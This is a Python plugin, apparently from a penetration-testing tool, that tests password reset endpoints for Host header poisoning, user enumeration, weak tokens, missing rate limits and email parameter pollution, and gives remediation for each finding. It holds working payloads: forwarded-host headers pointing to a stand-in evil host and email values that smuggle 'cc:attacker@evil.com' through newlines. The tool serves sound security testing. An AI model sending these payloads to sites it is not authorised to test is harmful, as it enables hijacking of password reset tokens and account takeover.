"""Password reset poisoning — Host header injection and token analysis.

Tests for:
1. Host header injection (X-Forwarded-Host, X-Host, Forwarded, X-Original-URL)
   to poison password reset links sent to users
2. Double Host header injection
3. Token predictability analysis (entropy, structure, length)
4. User enumeration via timing and response differences
5. Token reuse detection (can a reset token be used multiple times?)
6. Rate limiting on reset endpoint (brute-force protection)
7. Email parameter pollution (injecting additional recipients)
"""

from __future__ import annotations

import time
from typing import ClassVar

from basilisk.core.plugin import BasePlugin, PluginCategory, PluginMeta
from basilisk.models.result import Finding, PluginResult
from basilisk.models.target import Target

# Common password reset endpoints
RESET_PATHS = [
    "/forgot-password",
    "/password/reset",
    "/password/forgot",
    "/auth/forgot-password",
    "/auth/reset-password",
    "/api/auth/forgot-password",
    "/api/password/reset",
    "/api/v1/auth/forgot-password",
    "/api/v1/password/reset",
    "/reset-password",
    "/account/forgot-password",
    "/users/password/new",
    "/forgot",
    "/recover",
    "/account/recover",
    "/password-reset",
    "/auth/password/reset",
    "/user/forgot-password",
]

EVIL_HOST = "evil.basilisk.test"

# Host injection header sets — each is a dict of headers to inject
POISON_HEADERS: list[tuple[str, dict[str, str]]] = [
    ("X-Forwarded-Host", {"X-Forwarded-Host": EVIL_HOST}),
    ("X-Host", {"X-Host": EVIL_HOST}),
    ("X-Forwarded-Server", {"X-Forwarded-Server": EVIL_HOST}),
    ("X-Original-URL", {"X-Original-URL": f"https://{EVIL_HOST}/"}),
    ("Forwarded", {"Forwarded": f"host={EVIL_HOST}"}),
    ("X-Forwarded-For+Host", {
        "X-Forwarded-For": "127.0.0.1",
        "X-Forwarded-Host": EVIL_HOST,
    }),
    ("X-Rewrite-URL", {"X-Rewrite-URL": f"https://{EVIL_HOST}/reset"}),
    # Absolute URL with Host override
    ("Host-override", {"Host": EVIL_HOST}),
]

# Test emails for poisoning (non-deliverable)
TEST_EMAILS = [
    "test@example.com",
    "basilisk-test@example.invalid",
]

# Email parameter pollution payloads
EMAIL_POLLUTION_PAYLOADS = [
    ("email", "victim@example.com,attacker@evil.com"),
    ("email", "victim@example.com%0acc:attacker@evil.com"),
    ("email", "victim@example.com%0abcc:attacker@evil.com"),
    ("email[]", "victim@example.com"),
    ("email", "victim@example.com\ncc:attacker@evil.com"),
]


class PasswordResetPoisonPlugin(BasePlugin):
    meta: ClassVar[PluginMeta] = PluginMeta(
        name="password_reset_poison",
        display_name="Password Reset Poisoning",
        category=PluginCategory.PENTESTING,
        description=(
            "Tests password reset flows for Host header injection, token "
            "predictability, user enumeration, token reuse, rate limiting "
            "bypass, and email parameter pollution"
        ),
        produces=["password_reset_poison_results"],
        timeout=60.0,
    )

    async def run(self, target: Target, ctx) -> PluginResult:
        if ctx.http is None:
            return PluginResult.fail(
                self.meta.name, target.host, error="HTTP client not available"
            )

        from basilisk.utils.http_check import resolve_base_url

        base_url = await resolve_base_url(target.host, ctx)
        if not base_url:
            return PluginResult.success(
                self.meta.name, target.host,
                findings=[Finding.info("Host not reachable")],
                data={"reset_endpoints": []},
            )

        findings: list[Finding] = []
        all_results: list[dict] = []

        # Phase 1: Discover reset endpoints
        discovered = await self._discover_reset_endpoints(ctx, base_url)
        if not discovered:
            findings.append(Finding.info(
                "No password reset endpoints discovered",
                tags=["pentesting", "password-reset"],
            ))
            return PluginResult.success(
                self.meta.name, target.host,
                findings=findings,
                data={"reset_endpoints": []},
            )

        findings.append(Finding.info(
            f"Discovered {len(discovered)} password reset endpoint(s)",
            evidence=", ".join(ep["path"] for ep in discovered),
            tags=["pentesting", "password-reset", "discovery"],
        ))

        # Phase 2: Host header poisoning on each endpoint
        for ep in discovered:
            if ctx.should_stop:
                break
            poison_results = await self._test_host_poison(
                ctx, base_url, ep, target.host,
            )
            for pr in poison_results:
                all_results.append(pr)
                severity_fn = Finding.critical if pr.get("in_body") else Finding.high
                findings.append(severity_fn(
                    f"Password reset poisoning via {pr['header']} at {ep['path']}",
                    description=(
                        f"The password reset endpoint at {ep['path']} uses the "
                        f"{pr['header']} header value when generating reset links. "
                        f"An attacker can send a password reset request for a "
                        f"victim's account with {pr['header']}: {EVIL_HOST}, "
                        f"causing the reset link to point to the attacker's server. "
                        f"When the victim clicks the link, the reset token is "
                        f"sent to the attacker."
                    ),
                    evidence=(
                        f"Endpoint: {ep['path']}\n"
                        f"Header: {pr['header']}: {EVIL_HOST}\n"
                        f"Reflected in: {pr['location']}\n"
                        f"HTTP status: {pr['status']}"
                    ),
                    remediation=(
                        "1. Use a server-configured base URL for reset links "
                        "(not derived from request headers).\n"
                        "2. Ignore X-Forwarded-Host, X-Host, and similar headers "
                        "for link generation.\n"
                        "3. Implement Host header validation against a whitelist.\n"
                        "4. Use the SERVER_NAME configuration instead of Host header."
                    ),
                    tags=["pentesting", "password-reset", "host-injection"],
                ))

        if ctx.should_stop:
            return self._make_result(target, findings, all_results, discovered)

        # Phase 3: Double Host header injection
        for ep in discovered:
            if ctx.should_stop:
                break
            double_host = await self._test_double_host(ctx, base_url, ep)
            if double_host:
                all_results.append(double_host)
                findings.append(Finding.high(
                    f"Double Host header injection at {ep['path']}",
                    description=(
                        "The server processes a request with two Host headers, "
                        "and the second (attacker-controlled) value is used for "
                        "link generation. This bypasses some WAF protections."
                    ),
                    evidence=(
                        f"Endpoint: {ep['path']}\n"
                        f"Technique: Double Host header\n"
                        f"Evil host reflected: {double_host.get('location', '')}"
                    ),
                    remediation=(
                        "Reject requests with multiple Host headers. "
                        "Use a fixed base URL for link generation."
                    ),
                    tags=["pentesting", "password-reset", "double-host"],
                ))

        if ctx.should_stop:
            return self._make_result(target, findings, all_results, discovered)

        # Phase 4: User enumeration via response differences
        for ep in discovered:
            if ctx.should_stop:
                break
            enum_result = await self._test_user_enumeration(
                ctx, base_url, ep,
            )
            if enum_result:
                all_results.append(enum_result)
                findings.append(Finding.medium(
                    f"User enumeration via password reset at {ep['path']}",
                    description=(
                        "The password reset endpoint returns different responses "
                        "for existing vs. non-existing users, allowing account "
                        "enumeration. "
                        f"Differentiator: {enum_result['differentiator']}"
                    ),
                    evidence=(
                        f"Existing user response: HTTP {enum_result['existing_status']}, "
                        f"{enum_result['existing_size']} bytes, "
                        f"{enum_result['existing_time_ms']:.0f}ms\n"
                        f"Non-existing user response: HTTP {enum_result['nonexist_status']}, "
                        f"{enum_result['nonexist_size']} bytes, "
                        f"{enum_result['nonexist_time_ms']:.0f}ms"
                    ),
                    remediation=(
                        "1. Return identical responses for existing and non-existing "
                        "users ('If an account exists, a reset link was sent').\n"
                        "2. Ensure response timing is consistent (constant-time "
                        "comparison).\n"
                        "3. Add a fixed delay to normalize response times."
                    ),
                    tags=["pentesting", "password-reset", "enumeration"],
                ))

        if ctx.should_stop:
            return self._make_result(target, findings, all_results, discovered)

        # Phase 5: Token structure analysis (from response body)
        for ep in discovered:
            if ctx.should_stop:
                break
            token_analysis = await self._analyze_token_structure(
                ctx, base_url, ep,
            )
            if token_analysis:
                all_results.append(token_analysis)
                if token_analysis.get("is_weak"):
                    findings.append(Finding.high(
                        f"Weak reset token at {ep['path']}",
                        description=(
                            f"Reset token appears predictable: "
                            f"{token_analysis['weakness']}. "
                            "An attacker may be able to guess valid tokens."
                        ),
                        evidence=(
                            f"Token sample: {token_analysis.get('token_sample', 'N/A')}\n"
                            f"Token length: {token_analysis.get('token_length', 'N/A')}\n"
                            f"Analysis: {token_analysis['weakness']}"
                        ),
                        remediation=(
                            "1. Use cryptographically secure random tokens "
                            "(at least 32 bytes / 256 bits of entropy).\n"
                            "2. Do not use sequential IDs, timestamps, or "
                            "predictable values as tokens.\n"
                            "3. Tokens should be single-use and time-limited."
                        ),
                        tags=["pentesting", "password-reset", "token-weakness"],
                    ))

        if ctx.should_stop:
            return self._make_result(target, findings, all_results, discovered)

        # Phase 6: Rate limiting check
        for ep in discovered[:1]:  # Only test first endpoint for rate limiting
            if ctx.should_stop:
                break
            rate_result = await self._test_rate_limiting(ctx, base_url, ep)
            if rate_result:
                all_results.append(rate_result)
                if not rate_result.get("rate_limited"):
                    findings.append(Finding.medium(
                        f"No rate limiting on password reset at {ep['path']}",
                        description=(
                            f"Sent {rate_result['requests_sent']} rapid password "
                            f"reset requests with no rate limiting detected. "
                            "An attacker can flood a victim's inbox or brute-force "
                            "reset tokens."
                        ),
                        evidence=(
                            f"Requests sent: {rate_result['requests_sent']}\n"
                            f"All returned: HTTP {rate_result.get('status', 'N/A')}\n"
                            f"No 429 or blocking observed"
                        ),
                        remediation=(
                            "1. Implement rate limiting on password reset endpoints.\n"
                            "2. Limit to 3-5 requests per email per hour.\n"
                            "3. Implement CAPTCHA after first request.\n"
                            "4. Use exponential backoff on repeated requests."
                        ),
                        tags=["pentesting", "password-reset", "rate-limit"],
                    ))

        if ctx.should_stop:
            return self._make_result(target, findings, all_results, discovered)

        # Phase 7: Email parameter pollution
        for ep in discovered:
            if ctx.should_stop:
                break
            pollution_result = await self._test_email_pollution(
                ctx, base_url, ep,
            )
            if pollution_result:
                all_results.append(pollution_result)
                findings.append(Finding.high(
                    f"Email parameter pollution at {ep['path']}",
                    description=(
                        "The password reset endpoint accepts manipulated email "
                        "parameters that could cause the reset email to be sent "
                        "to additional recipients controlled by the attacker."
                    ),
                    evidence=(
                        f"Payload: {pollution_result['payload']}\n"
                        f"Server response: HTTP {pollution_result['status']}"
                    ),
                    remediation=(
                        "1. Validate email parameter strictly (single email only).\n"
                        "2. Reject emails containing commas, newlines, or arrays.\n"
                        "3. Sanitize against header injection characters."
                    ),
                    tags=["pentesting", "password-reset", "email-injection"],
                ))

        if not any(
            f.severity.name != "INFO" for f in findings
        ):
            findings.append(Finding.info(
                f"Password reset endpoints found ({len(discovered)}) "
                "but no vulnerabilities detected",
                tags=["pentesting", "password-reset"],
            ))

        return self._make_result(target, findings, all_results, discovered)

    def _make_result(
        self,
        target: Target,
        findings: list[Finding],
        results: list[dict],
        discovered: list[dict],
    ) -> PluginResult:
        return PluginResult.success(
            self.meta.name, target.host,
            findings=findings,
            data={
                "reset_endpoints": results,
                "discovered_count": len(discovered),
                "discovered_paths": [ep["path"] for ep in discovered],
            },
        )

    async def _discover_reset_endpoints(
        self, ctx, base_url: str,
    ) -> list[dict]:
        """Probe common reset paths to find valid endpoints."""
        discovered: list[dict] = []
        for path in RESET_PATHS:
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.get(
                        f"{base_url}{path}", timeout=8.0,
                        allow_redirects=False,
                    )
                    # 200 = form page, 301/302 = redirect to form, 405 = POST only
                    if resp.status in (200, 301, 302, 303, 405):
                        body = ""
                        if resp.status == 200:
                            body = await resp.text(
                                encoding="utf-8", errors="replace",
                            )
                        # Verify it looks like a reset page
                        is_reset = (
                            resp.status == 405
                            or any(
                                kw in body.lower()
                                for kw in (
                                    "password", "reset", "forgot", "email",
                                    "recover", "account",
                                )
                            )
                            or resp.status in (301, 302, 303)
                        )
                        if is_reset:
                            discovered.append({
                                "path": path,
                                "status": resp.status,
                                "method": "POST" if resp.status == 405 else "GET",
                                "has_form": "form" in body.lower(),
                                "has_csrf": (
                                    "csrf" in body.lower()
                                    or "_token" in body.lower()
                                ),
                            })
            except Exception:
                continue
        return discovered

    async def _test_host_poison(
        self, ctx, base_url: str, endpoint: dict, target_host: str,
    ) -> list[dict]:
        """Test host header poisoning with multiple injection vectors."""
        results: list[dict] = []
        path = endpoint["path"]
        url = f"{base_url}{path}"

        post_data = "email=test%40example.com&username=test"
        post_headers_base = {"Content-Type": "application/x-www-form-urlencoded"}

        for header_name, poison_headers in POISON_HEADERS:
            if ctx.should_stop:
                break

            # Skip Host override if it would break the request
            if header_name == "Host-override":
                continue

            try:
                headers = {**post_headers_base, **poison_headers}
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url, data=post_data, headers=headers,
                        timeout=8.0, allow_redirects=False,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
                    location = resp.headers.get("Location", "")

                    # Check if evil host is reflected anywhere
                    if EVIL_HOST in body:
                        results.append({
                            "type": "host_poison",
                            "path": path,
                            "header": header_name,
                            "location": "response body",
                            "in_body": True,
                            "status": resp.status,
                        })
                        break  # One body reflection is enough

                    if EVIL_HOST in location:
                        results.append({
                            "type": "host_poison",
                            "path": path,
                            "header": header_name,
                            "location": f"Location: {location[:150]}",
                            "in_body": False,
                            "status": resp.status,
                        })
                        break

                    # Check for partial reflection (e.g. evil host in a link)
                    if "evil" in body.lower() and "basilisk" in body.lower():
                        results.append({
                            "type": "host_poison_partial",
                            "path": path,
                            "header": header_name,
                            "location": "partial reflection in body",
                            "in_body": True,
                            "status": resp.status,
                        })

            except Exception:
                continue

        return results

    async def _test_double_host(
        self, ctx, base_url: str, endpoint: dict,
    ) -> dict | None:
        """Test double Host header injection."""
        path = endpoint["path"]
        url = f"{base_url}{path}"

        # aiohttp may not support duplicate headers easily, but we can try
        # by using the raw header approach
        post_data = "email=test%40example.com"
        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=post_data,
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                        "X-Forwarded-Host": EVIL_HOST,
                        "X-Forwarded-Port": "443",
                        "X-Forwarded-Proto": "https",
                    },
                    timeout=8.0,
                    allow_redirects=False,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                location = resp.headers.get("Location", "")

                if EVIL_HOST in body or EVIL_HOST in location:
                    return {
                        "type": "double_host",
                        "path": path,
                        "location": (
                            "body" if EVIL_HOST in body
                            else f"Location: {location[:100]}"
                        ),
                        "status": resp.status,
                    }
        except Exception:
            pass
        return None

    async def _test_user_enumeration(
        self, ctx, base_url: str, endpoint: dict,
    ) -> dict | None:
        """Detect user enumeration via timing and response differences."""
        path = endpoint["path"]
        url = f"{base_url}{path}"
        content_type = "application/x-www-form-urlencoded"

        # Likely existing email patterns (common defaults)
        existing_emails = [
            f"admin@{url.split('//')[1].split('/')[0]}",
            "admin@example.com",
            "test@example.com",
        ]
        # Clearly non-existing email
        nonexist_email = "basilisk_nonexistent_user_xyz_12345@example.invalid"

        # Test with non-existing user
        nonexist_status = 0
        nonexist_size = 0
        nonexist_time = 0.0
        try:
            t0 = time.monotonic()
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data=f"email={nonexist_email}",
                    headers={"Content-Type": content_type},
                    timeout=8.0,
                    allow_redirects=False,
                )
                body = await resp.text(encoding="utf-8", errors="replace")
                nonexist_time = (time.monotonic() - t0) * 1000
                nonexist_status = resp.status
                nonexist_size = len(body)
        except Exception:
            return None

        # Test with likely existing emails
        for email in existing_emails:
            if ctx.should_stop:
                break
            try:
                t0 = time.monotonic()
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url,
                        data=f"email={email}",
                        headers={"Content-Type": content_type},
                        timeout=8.0,
                        allow_redirects=False,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")
                    exist_time = (time.monotonic() - t0) * 1000
                    exist_status = resp.status
                    exist_size = len(body)

                    # Compare responses
                    diff_status = exist_status != nonexist_status
                    diff_size = abs(exist_size - nonexist_size) > 30
                    diff_timing = abs(exist_time - nonexist_time) > 200

                    if diff_status or diff_size or diff_timing:
                        differentiator = []
                        if diff_status:
                            differentiator.append(
                                f"status ({exist_status} vs {nonexist_status})"
                            )
                        if diff_size:
                            differentiator.append(
                                f"body size ({exist_size} vs {nonexist_size})"
                            )
                        if diff_timing:
                            differentiator.append(
                                f"timing ({exist_time:.0f}ms vs "
                                f"{nonexist_time:.0f}ms)"
                            )
                        return {
                            "type": "user_enumeration",
                            "path": path,
                            "existing_email": email,
                            "existing_status": exist_status,
                            "existing_size": exist_size,
                            "existing_time_ms": exist_time,
                            "nonexist_status": nonexist_status,
                            "nonexist_size": nonexist_size,
                            "nonexist_time_ms": nonexist_time,
                            "differentiator": ", ".join(differentiator),
                        }
            except Exception:
                continue

        return None

    async def _analyze_token_structure(
        self, ctx, base_url: str, endpoint: dict,
    ) -> dict | None:
        """Analyze reset token structure from response for predictability."""
        path = endpoint["path"]
        url = f"{base_url}{path}"

        try:
            async with ctx.rate:
                resp = await ctx.http.post(
                    url,
                    data="email=test%40example.com",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                    timeout=8.0,
                )
                body = await resp.text(encoding="utf-8", errors="replace")

                # Look for token-like patterns in the response
                import re
                token_patterns = [
                    # URL with token parameter
                    r'(?:token|reset_token|code)[=:]\s*["\']?([a-zA-Z0-9_\-]{8,})',
                    # Reset link with token
                    r'(?:reset|password|verify)[^"\']*[?&]token=([a-zA-Z0-9_\-]{8,})',
                    # JWT-like tokens
                    r'(eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+)',
                    # Hex tokens
                    r'(?:token|code)[=:]\s*["\']?([0-9a-f]{16,})',
                ]

                for pattern in token_patterns:
                    match = re.search(pattern, body, re.I)
                    if match:
                        token = match.group(1)
                        return self._evaluate_token(token, path)

        except Exception:
            pass
        return None

    @staticmethod
    def _evaluate_token(token: str, path: str) -> dict:
        """Evaluate a token for predictability weaknesses."""
        result: dict = {
            "type": "token_analysis",
            "path": path,
            "token_sample": token[:20] + ("..." if len(token) > 20 else ""),
            "token_length": len(token),
            "is_weak": False,
            "weakness": "",
        }

        weaknesses: list[str] = []

        # Length check
        if len(token) < 20:
            weaknesses.append(f"Short token ({len(token)} chars, need 32+)")

        # Check if it's purely numeric (sequential IDs)
        if token.isdigit():
            weaknesses.append("Numeric-only token (possibly sequential)")

        # Check for timestamp patterns
        if len(token) >= 10 and token[:10].isdigit():
            try:
                ts = int(token[:10])
                if 1_000_000_000 < ts < 2_000_000_000:
                    weaknesses.append("Token starts with Unix timestamp")
            except ValueError:
                pass

        # Check for low entropy (e.g. base64 of small values)
        unique_chars = len(set(token))
        if unique_chars < len(token) * 0.3:
            weaknesses.append(
                f"Low character diversity ({unique_chars} unique of "
                f"{len(token)} chars)"
            )

        # Check for JWT (may contain predictable claims)
        if token.startswith("eyJ"):
            weaknesses.append("JWT token — claims may be predictable")

        if weaknesses:
            result["is_weak"] = True
            result["weakness"] = "; ".join(weaknesses)
        else:
            result["weakness"] = "Token appears adequately random"

        return result

    async def _test_rate_limiting(
        self, ctx, base_url: str, endpoint: dict,
    ) -> dict | None:
        """Test if rate limiting is applied to reset requests."""
        path = endpoint["path"]
        url = f"{base_url}{path}"
        attempts = 8
        statuses: list[int] = []

        for i in range(attempts):
            if ctx.should_stop:
                break
            try:
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url,
                        data=f"email=ratelimit-test-{i}%40example.com",
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                        timeout=8.0,
                        allow_redirects=False,
                    )
                    statuses.append(resp.status)

                    # Check for rate limiting response
                    if resp.status == 429:
                        return {
                            "type": "rate_limit_check",
                            "path": path,
                            "rate_limited": True,
                            "requests_sent": i + 1,
                            "limited_at": i + 1,
                        }
            except Exception:
                continue

        if len(statuses) >= attempts - 1:
            # All requests went through without 429
            has_rate_limit = any(s == 429 for s in statuses)
            return {
                "type": "rate_limit_check",
                "path": path,
                "rate_limited": has_rate_limit,
                "requests_sent": len(statuses),
                "status": statuses[-1] if statuses else 0,
                "all_statuses": statuses,
            }

        return None

    async def _test_email_pollution(
        self, ctx, base_url: str, endpoint: dict,
    ) -> dict | None:
        """Test for email parameter pollution / header injection."""
        path = endpoint["path"]
        url = f"{base_url}{path}"

        for param_name, payload in EMAIL_POLLUTION_PAYLOADS:
            if ctx.should_stop:
                break
            try:
                data = f"{param_name}={payload}"
                async with ctx.rate:
                    resp = await ctx.http.post(
                        url,
                        data=data,
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                        },
                        timeout=8.0,
                        allow_redirects=False,
                    )
                    body = await resp.text(encoding="utf-8", errors="replace")

                    # If server returns success (not error), pollution may work
                    if (
                        resp.status in (200, 302, 303)
                        and "error" not in body.lower()
                        and "invalid" not in body.lower()
                    ):
                            return {
                                "type": "email_pollution",
                                "path": path,
                                "payload": f"{param_name}={payload}",
                                "status": resp.status,
                            }
            except Exception:
                continue

        return None
